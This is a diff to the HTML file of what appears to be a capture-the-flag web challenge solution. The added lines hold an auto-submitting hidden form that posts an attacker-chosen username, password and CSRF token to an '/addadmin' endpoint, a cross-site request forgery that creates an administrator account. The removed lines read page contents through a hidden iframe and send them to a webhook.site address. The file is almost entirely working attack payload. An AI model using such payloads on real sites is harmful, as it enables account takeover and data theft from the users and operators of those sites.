@@ -3,13 +3,16 @@
 
 <body>
     Challenge Solution HTML
+    <form method="post" action="http://localhost/addadmin" id="form">
+        <input type="text" name="username" class="form-control" placeholder="Username" value="hoang174" />
+		<input type="password" name="password" class="form-control" placeholder="Password" value="123" />
+		<input type="hidden" name="csrf-token" value="b9b312fddfc601fe4dca79b69e42373e" />
+    </form>
 </body>
+
+
 <script>
-//     document.writeln('<iframe id="iframe" src="http://localhost:8000/addadmin" width="0" height="0" onload="read()"></iframe>');
-//     function read() {
-//         fetch('https://webhook.site/0090b671-0c20-4d09-8c75-83e5fd16f4e4?' + document.getElementById("iframe").contentWindow.document.body.innerHTML);
-//     }
-    fetch('https://webhook.site/0090b671-0c20-4d09-8c75-83e5fd16f4e4');
+    document.getElementById("form").submit();
 </script>
 
 </html>
